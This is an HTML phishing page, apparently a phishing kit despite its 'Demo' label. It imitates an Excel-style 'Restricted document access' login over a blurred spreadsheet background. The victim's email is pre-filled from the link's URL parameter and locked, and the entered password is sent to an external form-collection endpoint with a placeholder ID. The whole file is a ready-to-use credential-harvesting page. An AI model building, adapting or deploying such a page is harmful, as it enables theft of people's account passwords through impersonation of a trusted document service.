<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Document Access (Demo)</title>

<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #e9ecef;
  }

  /* Spreadsheet-style blurred background */
  .bg {
    position: fixed;
    inset: 0;
    background:
      linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)),
      repeating-linear-gradient(
        0deg,
        #dddddd 0,
        #dddddd 1px,
        #ffffff 1px,
        #ffffff 22px
      );
    filter: blur(2px);
  }

  .modal {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 330px;
    background: #ffffff;
    border-radius: 6px;
    box-shadow: 0 16px 40px rgba(0,0,0,0.35);
    padding: 22px;
    text-align: center;
  }

  .icon {
    width: 40px;
    height: 40px;
    margin: 0 auto 12px;
    background: #1f7244;
    color: #fff;
    font-weight: bold;
    font-size: 20px;
    line-height: 40px;
    border-radius: 4px;
  }

  .modal p {
    font-size: 13px;
    color: #333;
    margin: 10px 0;
  }

  .modal input {
    width: 100%;
    padding: 9px;
    margin: 6px 0;
    border: 1px solid #cfcfcf;
    border-radius: 4px;
    font-size: 13px;
  }

  /* Make read-only email visually distinct */
  .modal input[readonly] {
    background-color: #eee;
    cursor: not-allowed;
  }

  .options {
    display: flex;
    align-items: center;
    font-size: 12px;
    color: #555;
    margin: 6px 0 14px;
  }

  .options input {
    margin-right: 6px;
  }

  button {
    width: 100%;
    padding: 10px;
    background: #1f7244;
    border: none;
    color: #ffffff;
    font-size: 14px;
    border-radius: 4px;
    cursor: pointer;
  }

  .footer-text {
    font-size: 11px;
    color: #777;
    margin-top: 12px;
  }
</style>
</head>

<body>

<div class="bg"></div>

<form class="modal" action="https://formcarry.com/s/YOUR_FORMCARRY_ID" method="POST">
  <div class="icon">X</div>

  <p>
    <strong>Restricted document access</strong><br>
    Enter your email to continue
  </p>

  <!-- Email input is readonly and pre-filled from URL -->
  <input type="email" id="email" name="email" placeholder="your@email.com" readonly required>

  <!-- Password is editable -->
  <input type="password" name="password" placeholder="Password" required>

  <div class="options">
    <input type="checkbox" id="remember" name="remember">
    <label for="remember">Remember my ID</label>
  </div>

  <button type="submit">Login Now</button>

  <div class="footer-text">
    Secure document preview Â· Demo interface
  </div>
</form>

<script>
  // Grab email from URL and set it to the readonly email input
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");
  if (email) {
    document.getElementById("email").value = email;
  }
</script>

</body>
</html>
